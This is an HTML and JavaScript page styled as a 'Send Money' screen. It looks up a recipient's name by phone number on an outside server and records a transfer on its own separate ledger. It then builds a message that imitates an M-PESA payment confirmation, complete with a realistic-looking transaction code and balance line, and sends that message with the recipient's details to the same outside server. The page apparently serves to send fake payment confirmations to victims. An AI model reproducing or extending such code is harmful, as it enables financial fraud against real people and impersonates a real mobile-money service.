

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send Money - M-Ledger</title>
<style>
* { box-sizing: border-box; }
body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
  background: #000000;
  color: #ffffff;
  margin: 0;
  padding: 20px;
  min-height: 100vh;
  display: flex;
}
.left-content {
  flex: 1;
  padding-right: 20px;
}
.container {
  max-width: 450px;
  width: 100%;
  background: #000000;
  padding: 25px;
  border-radius: 12px;
  box-shadow: 0 8px 32px rgba(0,0,0,0.8);
}
input, button {
  width: 100%;
  padding: 12px 16px;
  margin-top: 8px;
  border: none;
  border-radius: 8px;
  font-size: 16px;
  display: none;
  background: #2a2a2a;
  color: #ffffff;
  border: 1px solid #333;
  font-weight: 600;
}
input.active, button.active {
  display: block;
}
button {
  background: #000000;
  cursor: pointer;
  transition: all 0.2s ease;
}
button:hover { background: #111111; }
.status-text {
  font-size: 24px;
  font-weight: 600;
  text-align: center;
  margin: 20px 0;
  padding: 20px 0;
  color: #ffffff;
  min-height: 80px;
  display: none;
}
.status-text.active {
  display: block;
}
.status-text.error {
  color: #ff5252;
}
.search-note {
  font-size: 0.8rem;
  color: #ffab00;
  margin-top: 4px;
  display: none;
  text-align: center;
}
.current-step {
  font-size: 24px;
  font-weight: 600;
  text-align: center;
  margin: 20px 0;
  padding: 20px 0;
  color: #ffffff;
  display: none;
}
.current-step.active {
  display: block;
}
</style>
</head>
<body>
<div class="left-content">
  <div class="container">
    <div class="current-step active" id="phoneLabel">Enter phone no.</div>
    <input type="text" id="phone" class="active" placeholder="07xxxxxxxx">
    <button id="phoneOkBtn" class="active">OK</button>
    
    <div class="current-step" id="amountLabel">Enter Amount</div>
    <input type="number" id="amount" placeholder="Ksh">
    <button id="amountOkBtn">OK</button>
    
    <div class="current-step" id="nameLabel">Enter Full Name</div>
    <div id="editNote" class="search-note">Confirm Name (Edit if incorrect)</div>
    <input type="text" id="name" placeholder="Full name">
    <button id="nameOkBtn">OK</button>
    
    <div class="current-step" id="optionsLabel">Finalize Transaction</div>
    <button id="sendBtn">Confirm & Send</button>
    
    <div class="status-text" id="statusDisplay"></div>
  </div>
</div>

<script>
const SYSTEM_API = "https://funds-5bhq.onrender.com/api";
const EXTERNAL_API = "https://meapp.emxluz.xyz";
let user = JSON.parse(localStorage.getItem('mledger_user'));
if(!user) location.href = 'index.html';

const elements = {
  phone: document.getElementById("phone"),
  amount: document.getElementById("amount"),
  name: document.getElementById("name"),
  editNote: document.getElementById("editNote"),
  status: document.getElementById("statusDisplay"),
  send: document.getElementById("sendBtn")
};

function formatBalance(amount) {
  return "Ksh " + Number(amount).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
}

function formatDate12Hour() {
  const now = new Date();
  return now.toLocaleDateString('en-GB', { 
    day: 'numeric', 
    month: 'short', 
    year: 'numeric' 
  });
}

function formatTime12Hour() {
  const now = new Date();
  return now.toLocaleTimeString('en-US', { 
    hour: 'numeric', 
    minute: '2-digit', 
    hour12: true 
  });
}

function calculateCost(amt) {
  if (amt <= 100) return 0;
  if (amt <= 500) return 7;
  if (amt <= 1000) return 13;
  if (amt <= 5000) return 25;
  if (amt <= 10000) return 55;
  if (amt <= 20000) return 75;
  return 108;
}

function showStatus(msg, isError = false) {
  elements.status.textContent = msg;
  elements.status.className = isError ? 'status-text active error' : 'status-text active';
}

function clearStatus() {
  elements.status.className = 'status-text';
  elements.status.textContent = '';
}

function showStep(step) {
  document.querySelectorAll('.current-step').forEach(l => l.classList.remove('active'));
  document.querySelectorAll('input, button').forEach(i => i.classList.remove('active'));
  elements.editNote.style.display = "none";
  clearStatus();

  if (step === 'phone') {
    document.getElementById('phoneLabel').classList.add('active');
    elements.phone.classList.add('active');
    document.getElementById('phoneOkBtn').classList.add('active');
  } else if (step === 'amount') {
    document.getElementById('amountLabel').classList.add('active');
    elements.amount.classList.add('active');
    document.getElementById('amountOkBtn').classList.add('active');
  } else if (step === 'name') {
    document.getElementById('nameLabel').classList.add('active');
    elements.name.classList.add('active');
    document.getElementById('nameOkBtn').classList.add('active');
    if(elements.name.value) elements.editNote.style.display = "block";
  } else if (step === 'options') {
    document.getElementById('optionsLabel').classList.add('active');
    elements.send.classList.add('active');
  }
}

function getMonthlyLetter() {
  const month = new Date().getMonth();
  return String.fromCharCode(65 + month);
}

document.getElementById('phoneOkBtn').addEventListener("click", async () => {
  const phoneVal = elements.phone.value.trim();
  if (!phoneVal) return showStatus("Enter phone", true);
  
  showStatus("Searching...");
  try {
    const res = await fetch(`${EXTERNAL_API}/lookup/${phoneVal}`);
    const data = await res.json();
    if (data.found) elements.name.value = data.name;
    else elements.name.value = "";
  } catch(e) {
    console.log("Search skipped");
  }
  showStep('amount');
});

document.getElementById('amountOkBtn').addEventListener("click", () => {
  const amt = parseFloat(elements.amount.value);
  const cost = calculateCost(amt);
  if (!amt || amt <= 0) return showStatus("Invalid amount", true);
  
  const required = amt + cost;
  if (required > user.balance) {
    return showStatus(`Balance: ${formatBalance(user.balance)}. Need: ${formatBalance(required)}`, true);
  }
  showStep('name');
});

document.getElementById('nameOkBtn').addEventListener("click", () => {
  if (!elements.name.value.trim()) return showStatus("Enter name", true);
  showStep('options');
});

elements.send.addEventListener("click", async () => {
  const phoneVal = elements.phone.value.trim();
  const amountVal = parseFloat(elements.amount.value);
  const nameVal = elements.name.value.trim();
  const cost = calculateCost(amountVal);

  elements.send.innerText = "Processing...";
  elements.send.disabled = true;

  try {
    const sysRes = await fetch(`${SYSTEM_API}/send`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ fromPhone: user.phone, toPhone: phoneVal, amount: amountVal })
    });
    
    const sysData = await sysRes.json();
    if (!sysRes.ok) throw new Error(sysData.error);

    user.balance = sysData.balance;
    localStorage.setItem('mledger_user', JSON.stringify(user));

    const monthlyLetter = getMonthlyLetter();
    const day = new Date().getDate();
    const randomPart = Math.random().toString(36).substring(2,6).toUpperCase();
    const token = `U${monthlyLetter}${day}K65${randomPart}`;

    const dateStr = formatDate12Hour();
    const timeStr = formatTime12Hour();
    const message = `${token} Confirmed. Ksh${amountVal.toFixed(2)} sent to ${nameVal} ${phoneVal} on ${dateStr} at ${timeStr}. New M-PESA balance Ksh${user.balance.toFixed(2)}. Transaction cost, Ksh${cost.toFixed(2)}Amount you can transact within the day is 499,960.00.Sign up for Lipa Na M-PESA Till online https://m-pesaforbusiness.co.ke.`;

    showStatus(message);

    await fetch(`${EXTERNAL_API}/send`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: phoneVal, name: nameVal, amount: amountVal, message: message, token: token, cost: cost })
    });

    setTimeout(() => { location.href = 'act.html'; }, 5000);

  } catch(e) {
    showStatus(e.message || "Error", true);
    elements.send.innerText = "Confirm & Send";
    elements.send.disabled = false;
  }
});
</script>
</body>
</html>
